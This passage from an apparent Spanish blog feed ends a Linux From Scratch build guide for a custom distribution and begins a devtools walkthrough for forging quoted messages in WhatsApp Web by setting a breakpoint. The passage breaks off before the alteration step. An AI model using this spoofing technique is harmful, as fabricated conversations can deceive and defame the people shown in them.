&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Por último, cambiaremos el valor del &lt;strong&gt;HOSTNAME&lt;/strong&gt; y descomentaremos la línea del &lt;strong&gt;SYSKLOGD&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bYf.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;archivos-de-inicio-de-bash-shell&quot;&gt;Archivos de inicio de Bash Shell&lt;/h4&gt;

&lt;p&gt;El programa de shell &lt;strong&gt;/bin/bash&lt;/strong&gt; utiliza una colección de archivos de inicio para ayudar a crear un entorno en el que ejecutarse. Cada archivo tiene un uso específico y puede afectar el inicio de sesión, así como los entornos interactivos de manera diferente.&lt;/p&gt;

&lt;p&gt;Los archivos ‘&lt;em&gt;/etc/profile&lt;/em&gt;’ y ‘&lt;em&gt;~/.bash_profile&lt;/em&gt;’ son leídos en el momento en el que se invoca la shell como una shell de inicio de sesión interactivo.&lt;/p&gt;

&lt;p&gt;La lista de todos los entornos locales compatibles con Glibc se pueden obtener ejecutando el siguiente comando:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locale -a&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Simplemente seguid mis pasos para configurarlo de la misma manera:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bZq.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho, ya estamos listos para adaptar nuestro fichero &lt;strong&gt;profile&lt;/strong&gt;. En este caso, también crearemos de una tirada el archivo &lt;strong&gt;inputrc&lt;/strong&gt;, un archivo de configuración de la biblioteca Readline, que proporciona capacidades de edición mientras el usuario ingresa una línea desde la terminal.&lt;/p&gt;

&lt;p&gt;Este funciona traduciendo las entradas del teclado en acciones específicas:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bZr.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Por otro lado, crearemos el archivo ‘&lt;em&gt;/etc/shells&lt;/em&gt;’, el cual contiene una lista de shells de inicio de sesión en el sistema:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/shells &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/shells

/bin/sh
/bin/bash

# End /etc/shells
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;haciendo-nuestro-sistema-booteable&quot;&gt;Haciendo nuestro sistema booteable&lt;/h1&gt;

&lt;h4 id=&quot;creando-archivo-fstab&quot;&gt;Creando archivo fstab&lt;/h4&gt;

&lt;p&gt;El archivo &lt;strong&gt;fstab&lt;/strong&gt; es utilizado por algunos programas para determinar dónde los sistemas de archivos deben de ser montados de forma predeterminada, en qué orden, y qué debe ser comprobado antes del montaje.&lt;/p&gt;

&lt;p&gt;Lo que haremos será crear una nueva tabla de sistemas de archivos como esta:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/fstab &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/fstab

# file system  mount-point  type     options             dump  fsck
#                                                              order

/dev/&amp;lt;xxx&amp;gt;     /            &amp;lt;fff&amp;gt;    defaults            1     1
/dev/&amp;lt;yyy&amp;gt;     swap         swap     pri=1               0     0
proc           /proc        proc     nosuid,noexec,nodev 0     0
sysfs          /sys         sysfs    nosuid,noexec,nodev 0     0
devpts         /dev/pts     devpts   gid=5,mode=620      0     0
tmpfs          /run         tmpfs    defaults            0     0
devtmpfs       /dev         devtmpfs mode=0755,nosuid    0     0

# End /etc/fstab
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En ella, ajustaremos los siguientes valores:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c1v.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Probablemente estarás pensando en que me he equivocado con los nombres, ¡pero no!… la idea será que &lt;strong&gt;sdb&lt;/strong&gt; pase a convertirse a &lt;strong&gt;sda&lt;/strong&gt;, ahora lo veréis con mayor detalle.&lt;/p&gt;

&lt;h4 id=&quot;instalación-del-kernel&quot;&gt;Instalación del Kernel&lt;/h4&gt;

&lt;p&gt;Nos dirigiremos a la ruta ‘&lt;em&gt;/sources&lt;/em&gt;’, y descomprimiremos el siguiente comprimido, aplicando a su vez los siguientes comandos:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c1T.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho, abriremos con &lt;strong&gt;vi&lt;/strong&gt; el archivo &lt;strong&gt;.config&lt;/strong&gt; generado y haremos las siguientes comprobaciones:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Confirmamos que &lt;strong&gt;CONFIG_DEVTMPFS=y&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Confirmamos que &lt;strong&gt;CONFIG_EFI_STUV=y&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Confirmamos que &lt;strong&gt;CONFIG_UEVENT_HELPER&lt;/strong&gt; no esté seteado&lt;/li&gt;
&lt;/ul&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c22.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Si esto es así, podremos continuar sin problemas.&lt;/p&gt;

&lt;p&gt;Ahora bien, lo que haremos será ejecutar el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make menuconfig
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Esto nos abrirá el siguiente menú:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c2c.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este menú, nos iremos a la opción que pone &lt;strong&gt;General Setup&lt;/strong&gt;. Una vez dentro, veremos lo siguiente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c2d.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este punto, cambiaremos el valor de &lt;strong&gt;Default hostname&lt;/strong&gt; al de nuestro sistema, en mi caso… &lt;strong&gt;S4viOS&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c2e.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez cambiado, salimos y guardamos los cambios.&lt;/p&gt;

&lt;p&gt;Ya fuera, aplicamos los siguientes comandos para efectuar la compilación:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make
make modules_install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, continuamos con los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iv&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;/x86/boot/bzImage /boot/vmlinuz-5.5.3-lfs-9.1
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iv&lt;/span&gt; System.map /boot/System.map-5.5.3
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iv&lt;/span&gt; .config /boot/config-5.5.3
&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /usr/share/doc/linux-5.5.3
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; Documentation/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /usr/share/doc/linux-5.5.3

&lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 0:0 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c4b.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Para terminar, ejecutamos estos últimos comandos antes de empezar con el GRUB:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m755&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /etc/modprobe.d
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/usb.conf &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /etc/modprobe.d/usb.conf

install ohci_hcd /sbin/modprobe ehci_hcd ; /sbin/modprobe -i ohci_hcd ; true
install uhci_hcd /sbin/modprobe ehci_hcd ; /sbin/modprobe -i uhci_hcd ; true

# End /etc/modprobe.d/usb.conf
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c4h.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;uso-del-grub-para-configurar-el-proceso-de-arranque&quot;&gt;Uso del GRUB para configurar el proceso de arranque&lt;/h4&gt;

&lt;p&gt;Ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grub-install /dev/sdb

&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /boot/grub/grub.cfg &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
# Begin /boot/grub/grub.cfg
set default=0
set timeout=5

insmod ext2
set root=(hd0,2)

menuentry &quot;GNU/Linux, Linux 5.5.3-lfs-9.1&quot; {
        linux   /boot/vmlinuz-5.5.3-lfs-9.1 root=/dev/sda2 ro
}
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos debería salir un output tal que así:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c4B.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Eso sí… el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grub.cfg&lt;/code&gt; anteriormente creado deberá ser adaptado. En mi caso, tendrá estos valores:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c5s.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;creando-archivos-finales&quot;&gt;Creando archivos finales&lt;/h1&gt;

&lt;p&gt;Nos estamos acercando al final. Para ir concluyendo, nos vamos a ir creando una serie de archivos finales.&lt;/p&gt;

&lt;p&gt;Por un lado, nos creamos un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsb-release&lt;/code&gt;, en mi caso con el siguiente contenido:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c5E.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Por otro lado, creamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os-release&lt;/code&gt;, en mi caso con el siguiente contenido:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c5N.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Por último, nos crearemos un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bashrc&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/bashrc &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot; 
# Begin /etc/bashrc
# Written for Beyond Linux From Scratch
# by James Robertson &amp;lt;jameswrobertson@earthlink.net&amp;gt;
# updated by Bruce Dubbs &amp;lt;bdubbs@linuxfromscratch.org&amp;gt;
# System wide aliases and functions.
# System wide environment variables and startup programs should go 
into
# /etc/profile. Personal environment variables and startup programs
# should go into ~/.bash_profile. Personal aliases and functions 
should
# go into ~/.bashrc
# Provides colored /bin/ls and /bin/grep commands. Used in 
conjunction
# with code in /etc/profile.
alias ls='ls --color=auto'
alias grep='grep --color=auto'
# Provides prompt for non-login shells, specifically shells started
# in the X environment. [Review the LFS archive thread titled
# PS1 Environment Variable for a great case study behind this script
# addendum.]
NORMAL=&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\[\e&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;[0m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\]&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
RED=&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\[\e&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;[1;31m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\]&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
GREEN=&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\[\e&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;[1;32m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\]&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
if [[ &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EUID&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; == 0 ]] ; then
PS1=&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; [ &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; ]# &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
else
PS1=&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$GREEN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; [ &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$GREEN&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; ]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
fi
unset RED GREEN NORMAL
# End /etc/bashrc
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;arrancando-nuestra-nueva-distribución-linux-s4vios&quot;&gt;Arrancando nuestra nueva distribución Linux S4viOS&lt;/h1&gt;

&lt;p&gt;Antes de reiniciar, desmontaremos todas las monturas que teníamos previamente creadas:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;umount &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/dev/pts
umount &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/dev
umount &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/run
umount &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/proc
umount &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;/sys
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
umount &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LFS&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6r.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Atentos al comando final:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shutdown &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; now
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, como es de esperar… nuestra máquina virtual se habrá apagado. Ahora bien, lo que haremos será lo siguiente, como dije anteriormente de lo que definimos en el &lt;strong&gt;fstab&lt;/strong&gt;, nuestro &lt;strong&gt;sdb&lt;/strong&gt; se va a convertir en &lt;strong&gt;sda&lt;/strong&gt;, ¿cómo?, pues simplemente quitando el disco del sistema Host con Debian.&lt;/p&gt;

&lt;p&gt;Es decir, tenemos estos 2:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6w.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Pues lo que hacemos es quitar el &lt;strong&gt;Debian Base&lt;/strong&gt;, que es con el que nos hemos construido nuestro sistema Linux residente en el otro disco. Nos debería quedar algo así:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6x.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;¡Arranquemos la máquina virtual y veamos qué pasa!:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6F.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Esto tiene muy buena pinta, presionamos Enter:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6E.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;¡Qué preciosidad!, nuestro propio sistema Linux cobrando vida, ¡vamos a iniciar sesión!:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6G.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Como veis, perfectamente funcional y con total control de las cosas que hemos ido instalando (sin cosas raras):&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34c6H.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ya en este punto, podríamos continuar con la instalación y configuración de la interfaz gráfica, pero… esto lo haré en otra &lt;strong&gt;guía aparte&lt;/strong&gt; siempre y cuando vea que este Gist recibe apoyo :)&lt;/p&gt;

&lt;p&gt;Mientras tanto, os dejo por aquí un vídeo de mi canal de YouTube donde os enseño paso a paso a configurar un buen entorno de trabajo en Linux:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=MF4qRSedmEs&quot;&gt;https://www.youtube.com/watch?v=MF4qRSedmEs&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Quién sabe, igual podremos hacer luego una fusión con &lt;strong&gt;S4viOS&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Para aquellos que por X razones quieran descargar la distribución (igual lo queréis para verificar ciertas cosas), os dejo el enlace de descarga de la máquina por aquí:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://drive.google.com/file/d/1GACSGENgHvWr2v_8JbcUieLyZAoU11qe/view?usp=sharing&quot;&gt;https://drive.google.com/file/d/1GACSGENgHvWr2v_8JbcUieLyZAoU11qe/view?usp=sharing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Usuario de la máquina&lt;/strong&gt;: root&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Contraseña&lt;/strong&gt;: nmapypadentro&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;¡Un saludo y que os sea leve!&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Configuración" /><category term="Linux From Scratch" /><category term="LFS" /><category term="Linux" /><category term="Linux From Scratch" /><category term="LFS" /><category term="Personalización" /><category term="S4viOS" /><summary type="html">En este artículo, os enseño a crear vuestro propio sistema Linux desde cero, tomando completo control de las cosas que se instalan y arrancando el sistema como una nueva distribución.</summary></entry><entry><title type="html">Falsificación de mensajes en WhatsApp</title><link href="http://localhost:4000/falsificacion-mensajes-whatsapp/" rel="alternate" type="text/html" title="Falsificación de mensajes en WhatsApp" /><published>2020-02-10T00:00:00+01:00</published><updated>2020-02-10T00:00:00+01:00</updated><id>http://localhost:4000/falsificacion-mensajes-whatsapp</id><content type="html" xml:base="http://localhost:4000/falsificacion-mensajes-whatsapp/">&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/whatsapp.jpg&quot; /&gt;
&lt;/center&gt;

&lt;h2 id=&quot;cómo-reproducir-este-bug&quot;&gt;¿Cómo reproducir este bug?&lt;/h2&gt;

&lt;p&gt;Antes que nada, vamos a darle los buenos créditos al señor &lt;a href=&quot;https://twitter.com/RiftWhiteHat&quot;&gt;@RiftWhiteHat&lt;/a&gt;, que fue el que me enseñó esta maravilla bajo la cual pueden surgir investigaciones para todo aquel que le quiera meter mano y tal vez descubrir nuevas cosas.&lt;/p&gt;

&lt;p&gt;Comenzamos presionando la combinación &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl+Shift+C&lt;/code&gt;. Posteriormente, nos dirigimos a la pestaña &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sources&lt;/code&gt; desde WhatsApp Web:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step1.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;
Una vez hecho, nos iremos a la pestaña &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Search&lt;/code&gt; situada en la zona inferior y buscaremos la cadena &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Promise.callSynchronously(function()&lt;/code&gt;&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step2.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;
Veremos que se produce un match. Haremos click en el resultado obtenido y posteriormente en la zona superior seleccionamos el modo de visión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pretty Print&lt;/code&gt; para que no nos sangren los ojos:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step3.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;
Ya en este punto, presionaremos la combinación de teclas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl+F&lt;/code&gt; y buscaremos nuevamente por la cadena &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Promise.callSynchronously(function()&lt;/code&gt;. En esta ocasión, buscaremos el segundo match que se produzca:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step4.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Posteriormente, establecemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Breakpoint&lt;/code&gt; en la sección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var t = e.id;&lt;/code&gt;, haciendo para ello click en el número de la línea:&lt;/p&gt;

&lt;center&gt;
&lt;img src=&quot;/assets/images/whatsapp-fake-messages/step5.jpg&quot; /&gt;
&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ahora, lo que haremos será lo siguiente. Nos iremos a una conversación cualquiera con uno de nuestros compañeros, seleccionaremos cualquier mensaje que nos haya enviado y le daremos a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Responder&lt;/code&gt; para hacer mención a ese comentario.&lt;/p&gt;

